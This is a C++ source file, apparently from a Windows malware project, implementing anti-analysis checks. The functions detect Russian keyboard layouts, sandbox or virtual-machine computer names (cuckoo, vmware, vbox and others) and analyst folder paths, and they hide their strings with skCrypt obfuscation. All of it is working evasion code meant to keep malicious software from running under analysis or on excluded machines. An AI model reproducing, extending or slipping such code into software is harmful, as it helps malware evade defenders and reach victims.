#include <safety_utils/antitarg.hpp>
#include <obfuscation/api_hash.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <windows.h>
#include <algorithm>
#include <string>
#include <cwctype>

namespace utils {

    bool is_russian_loaded() {
        HKL layouts[64];
        UINT count = GetKeyboardLayoutList(64, layouts);
        for (UINT i = 0; i < count; ++i) {
            if (PRIMARYLANGID(LOWORD(layouts[i])) == LANG_RUSSIAN)
                return true;
        }
        return false;
    }

    bool is_russian() {
        return PRIMARYLANGID(LOWORD(GetKeyboardLayout(0))) == LANG_RUSSIAN;
    }

    bool is_sandbox_name() {
        char raw[MAX_COMPUTERNAME_LENGTH + 1]{};
        DWORD sz = sizeof(raw);
        GetComputerNameA(raw, &sz);

        std::string lower(raw);
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        //doubt this would genuinely help.
        if (lower.find(skCrypt("sandbox"))  != std::string::npos) return true;
        if (lower.find(skCrypt("malware"))  != std::string::npos) return true;
        if (lower.find(skCrypt("virus"))    != std::string::npos) return true;
        if (lower.find(skCrypt("sample"))   != std::string::npos) return true;
        if (lower.find(skCrypt("analysis")) != std::string::npos) return true;
        if (lower.find(skCrypt("cuckoo"))   != std::string::npos) return true;
        if (lower.find(skCrypt("wilbert"))  != std::string::npos) return true;
        if (lower.find(skCrypt("vmware"))   != std::string::npos) return true;
        if (lower.find(skCrypt("vbox"))     != std::string::npos) return true;
        if (lower.find(skCrypt("thinapp"))  != std::string::npos) return true;
        if (lower.find(skCrypt("vmuser"))   != std::string::npos) return true;

        return false;
    }

    bool is_analyst_path() {
        wchar_t exe[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        for (int i = 0; exe[i]; i++) exe[i] = (wchar_t)towlower(exe[i]);
        std::wstring p(exe);

        //same as above
        if (p.find(skCrypt(L"\\virus\\"))      != std::wstring::npos) return true;
        if (p.find(skCrypt(L"\\malware\\"))    != std::wstring::npos) return true;
        if (p.find(skCrypt(L"\\samples\\"))    != std::wstring::npos) return true;
        if (p.find(skCrypt(L"\\sandbox\\"))    != std::wstring::npos) return true;
        if (p.find(skCrypt(L"\\analysis\\"))   != std::wstring::npos) return true;
        return false;
    }
}
